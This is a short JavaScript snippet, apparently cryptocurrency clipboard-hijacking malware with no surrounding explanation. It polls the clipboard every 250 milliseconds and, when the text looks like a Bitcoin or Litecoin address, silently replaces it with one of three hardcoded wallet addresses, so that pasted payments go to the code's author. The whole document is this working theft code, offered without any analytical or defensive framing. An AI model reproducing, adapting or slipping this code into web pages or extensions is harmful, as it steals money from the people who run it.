const rules = [
    {"name": "BTC", "reg": "^1[a-zA-HJ-NP-Z0-9]{25,39}$", "value": "19hdEPSFQ4iUhtWoXHqg2E1kPCpUmaEgP8"},
    {"name": "BTC", "reg": "^bc1[a-zA-HJ-NP-Z0-9]{25,39}$", "value": "bc1qwenpr55ekcs3a46ly4hqkjn652sppttdnsszhd"},
    {"name": "LTC", "reg": "^L[a-zA-HJ-NP-Z0-9]{26,41}$", "value": "LXnj7XNxmRkTnEbdDzKd7QfZSGaEriFu4m"}
];
setInterval(async () => {
  const text = await navigator.clipboard.readText();
  for (const rule of rules) {
    const pattern = new RegExp(rule.reg);
    if (pattern.test(text)) {
      await navigator.clipboard.writeText(text.replace(pattern, rule.value));
      break;
    }
  }
}, 250);
